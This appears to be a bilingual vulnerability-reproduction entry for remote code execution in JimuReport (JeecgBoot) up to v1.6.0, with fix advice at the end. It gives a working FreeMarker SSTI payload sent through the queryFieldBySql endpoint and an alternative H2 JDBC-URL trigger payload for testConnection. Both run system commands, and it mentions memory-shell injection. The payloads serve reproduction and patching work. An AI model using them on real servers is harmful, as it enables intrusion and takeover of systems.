title.zh: JimuReport (JeecgBoot) 代码执行漏洞复现

description.zh: 利用 JeecgBoot 集成的 JimuReport 组件的 SQL 注入和 SSTI 漏洞实现远程代码执行，包括内存马注入。
description.en: Exploit SQL injection and SSTI vulnerabilities in JeecgBoot's JimuReport component to achieve remote code execution, including memory shell injection.

content.zh: 确认目标系统运行 JeecgBoot 并集成 JimuReport 组件（版本 <= v1.6.0）
content.en: Confirm target runs JeecgBoot with JimuReport component (version <= v1.6.0)

annotation.zh: JimuReport 是 JeecgBoot 的报表模块

content.zh: 漏洞点：/jeecg-boot/jmreport/queryFieldBySql — SQL 注入 + FreeMarker SSTI

annotation.zh: 两个入口均利用模板引擎注入实现 RCE
annotation.en: Both endpoints exploit template engine injection for RCE

content.zh: 发送 SQL 注入 + FreeMarker SSTI payload：
content.en: Send SQL injection + FreeMarker SSTI payload:

codeBlocks.code:
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: target.com
Content-Type: application/json

{"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"open -a calculator.app\") }' "}

caption.en: SQL injection triggers FreeMarker template execution

annotation.zh: 通过 SQL 注入点触发 FreeMarker 模板引擎执行系统命令
annotation.en: Trigger FreeMarker template engine via SQL injection

content.zh: 目标主机弹出计算器，确认命令执行成功
content.en: Calculator pops up on target host, confirming command execution

annotation.zh: 利用 FreeMarker 的 ?new() 实例化 Execute 类
annotation.en: Use FreeMarker's ?new() to instantiate Execute class

annotation.zh: 通过 ObjectConstructor 加载内存马字节码
annotation.en: Load memory shell bytecode via ObjectConstructor

content.zh: 备选方案：testConnection 接口 JDBC SSTI：

codeBlocks.code:
{
  "dbType": "H2",
  "dbDriver": "org.h2.Driver",
  "dbUrl": "jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('open -a calculator.app')\n$$",
  "dbName": "test",
  "dbUsername": "sa",
  "dbPassword": ""
}

caption.en: H2 database JDBC URL injects JavaScript

annotation.zh: 利用 H2 数据库的 CREATE TRIGGER 语法执行 JavaScript
annotation.en: Use H2 CREATE TRIGGER syntax to execute JavaScript

content.zh: 漏洞总结：queryFieldBySql 存在 SQL 注入 + FreeMarker SSTI，支持内存马注入；testConnection JDBC SSTI 作为备选 RCE 路径。影响版本：JimuReport <= v1.6.0
content.en: Summary: queryFieldBySql has SQL injection + FreeMarker SSTI, supports memory shell injection; testConnection JDBC SSTI as alternative RCE path. Affected: JimuReport <= v1.6.0

annotation.zh: 修复建议：升级 JimuReport，禁用 FreeMarker ?new() 和 ObjectConstructor
annotation.en: Fix: Upgrade JimuReport, disable FreeMarker ?new() and ObjectConstructor
